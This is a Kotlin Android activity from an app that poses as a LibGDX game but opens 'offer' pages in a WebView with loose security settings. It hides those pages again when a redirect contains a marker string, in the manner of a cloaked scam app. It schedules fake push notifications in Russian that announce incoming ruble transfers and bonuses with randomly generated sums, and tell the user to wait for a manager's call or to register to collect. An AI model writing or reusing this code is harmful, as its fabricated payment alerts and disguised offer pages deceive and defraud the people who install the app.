package com.tinfenker.capitalnoestroy

import android.Manifest
import android.content.pm.ActivityInfo
import android.os.Build
import android.os.Bundle
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.tinfenker.capitalnoestroy.databinding.ActivityGameBinding
import com.tinfenker.capitalnoestroy.game.LibGDXGame
import com.tinfenker.capitalnoestroy.game.utils.runGDX
import com.tinfenker.capitalnoestroy.push.*
import com.tinfenker.capitalnoestroy.util.OneTime
import com.tinfenker.capitalnoestroy.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit
import kotlin.system.exitProcess

class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Main)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding

    var blockRedirect: () -> Unit = {}
    var blockBack    : () -> Unit = {}

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        NotificationManager.createChannel(this)
        registerPermissionNotification()

        initialize()
    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Init Web ----------------------------------------------------------------------------------

    fun initWeb() {
        coroutine.launch {
            binding.webView.apply {
                settings.apply {
                    allowFileAccessFromFileURLs = true
                    allowContentAccess = true
                    javaScriptEnabled = true
                    javaScriptCanOpenWindowsAutomatically = true
                    allowFileAccess = true
                    mixedContentMode = 0
                    useWideViewPort = true
                    allowUniversalAccessFromFileURLs = true
                    loadWithOverviewMode = true
                    domStorageEnabled = true
                    databaseEnabled = true
                }

                webViewClient = WebClient()

                // Реєструємо зворотний виклик у диспетчері
                onBackPressedDispatcher.addCallback {
                    if (canGoBack()) goBack() else {
                        if (isOffer.not() && isVisible) {
                            showWebView()
                        } else exit()
                    }
                }
            }
        }
    }

    private var isOffer = true

    fun showUrl(url: String, isOffer: Boolean = true) {
        coroutine.launch {
            log("showUrl: $url | isOffer = $isOffer")

            this@GameActivity.isOffer = isOffer
            binding.webView.loadUrl(url)

            setNavBarColor(R.color.white)
            showWebView()

        }
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {

            log("redirect: ${request?.url.toString()}")

            when {
                request?.url.toString().contains("bjslls") -> {
                    hideWebView()
                    runGDX {
                        log("contains")
                        blockRedirect()
                    }
                }
                request?.url.toString().contains("thanks") -> {
                    showNotificationNow()
                    WorkManager.getInstance(this@GameActivity).cancelAllWork()
                }
                else -> {
                    showNotificationLater()
                }
            }

            return false
        }
    }

    // Logic -----------------------------------------------------------------------------------------

    fun setNavBarColor(colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = getColor(colorId)
        }
    }

    fun hideWebView() {
        coroutine.launch {
            binding.navHostFragment.visibility = View.VISIBLE
            binding.webView.visibility         = View.GONE
            binding.navHostFragment.requestFocus()
            requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        }
    }

    private fun showWebView() {
        binding.navHostFragment.visibility = View.GONE
        binding.webView.visibility         = View.VISIBLE
        binding.webView.requestFocus()
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
    }

    // Push ------------------------------------------------------------------------------------------

    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean -> }

    private fun registerPermissionNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    fun showNotificationNow() {
        val suma = ((30..45).random() * 1000) + (100..999).random()
        val push = Push(R.drawable.push_icon, "\uD83D\uDCB3 Вам перевод: $suma₽", "Дождитесь звонка менеджера и получите выплату")

        NotificationManager.run {
            val notification = build(this@GameActivity, push)
            send(this@GameActivity, notification)
        }
    }

    fun showNotificationLater() {
        val suma  = ((30..45).random() * 1000) + (100..999).random()
        val title = "\uD83D\uDCB3Зачисление бонуса: $suma₽"
        val text  = "Заберите выплату после регистрации"

        val data = workDataOf(
            "title" to title,
            "text"  to text,
        )

        val notificationWork = OneTimeWorkRequestBuilder<NotificationWorker>()
            .setInputData(data)
            .setInitialDelay(20, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueueUniqueWork(
            "NotificationWork",
            ExistingWorkPolicy.REPLACE,
            notificationWork
        )
    }



}